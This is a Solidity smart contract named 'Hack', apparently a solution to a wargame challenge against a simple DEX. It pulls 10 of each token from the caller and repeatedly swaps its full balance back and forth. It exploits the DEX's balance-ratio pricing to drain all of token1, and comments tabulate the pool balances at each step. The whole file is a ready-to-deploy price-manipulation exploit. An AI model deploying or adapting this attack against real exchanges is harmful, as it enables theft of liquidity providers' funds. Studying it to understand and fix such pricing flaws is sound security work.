pragma solidity ^0.8;

contract Hack {
    IDex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(IDex _dex) {
        dex = _dex;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function pwn() external {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);

        dex.swap(address(token2), address(token1), 45);

        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
    }

    //     token 1 | token 2
    // 10 in  | 100 | 100 | 10 out
    // 24 out | 110 |  90 | 10 in
    // 24 in  |  86 | 110 | 30 out
    // 41 out | 110 |  80 | 30 in
    // 41 in  |  69 | 110 | 65 out
    //        | 110 |  45 |

    // 110 = token2 amount in * token1 balance / token2 balance
    // 110 = token2 amount in * 110 / 45
    // 45  = token2 amount in

    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        dex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
    }
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function swap(address from, address to, uint256 amount) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
